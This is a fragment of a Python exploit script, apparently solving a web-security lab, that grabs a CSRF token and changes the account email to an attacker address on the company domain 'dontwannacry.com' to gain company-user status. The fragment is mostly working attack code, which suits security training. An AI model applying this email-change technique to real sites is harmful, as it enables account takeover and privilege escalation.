...
def change_email(client, host):
    url = f'{host}/my-account'
    attack_email = 'attacker@dontwannacry.com'
    data = {'csrf': get_csrf_token(client.get(url).text),
            'email': attack_email}
    res = client.post(f'{url}/change-email', data=data)
    return f'Your email is: {attack_email}' in res.text
...
def main():
    ...
    if not change_email(client, host):
        print(f'[-] Failed to change email')
        sys.exit(-7)
    print(f'[+] Email changed to company user')
